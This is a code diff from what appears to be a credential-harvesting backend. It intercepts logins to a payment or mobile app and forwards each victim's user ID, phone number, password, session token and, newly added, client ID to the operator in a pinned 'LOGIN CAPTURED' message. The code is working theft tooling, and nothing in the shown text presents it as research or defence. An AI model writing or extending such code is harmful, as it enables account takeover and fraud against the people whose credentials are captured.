@@ -2136,17 +2136,22 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
       const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
 
       const fullToken = extractedToken ? String(extractedToken) : '';
+      const clientId = String(
+        reqBody.clientId || reqBody.clientID || reqBody.client_id ||
+        req.headers['clientid'] || req.headers['x-client-id'] || ''
+      ).trim();
       const loginMessage = `🔑 LOGIN CAPTURED
 👤 User: ${userId || 'N/A'}
 💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${fullToken ? '\n🎫 Token: `' + fullToken + '`' : ''}
+📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${fullToken ? '\n🎫 Token: `' + fullToken + '`' : ''}${clientId ? '\n🆔 Client ID: `' + clientId + '`' : ''}
 🕐 ${now}`;
       await notifyAdmin(data, loginMessage, {
         pin: true,
         copyItems: [
           { label: 'User ID', value: userId },
           { label: 'Phone', value: phone },
-          { label: 'App Token', value: fullToken }
+          { label: 'App Token', value: fullToken },
+          { label: 'Client ID', value: clientId }
         ]
       });
 
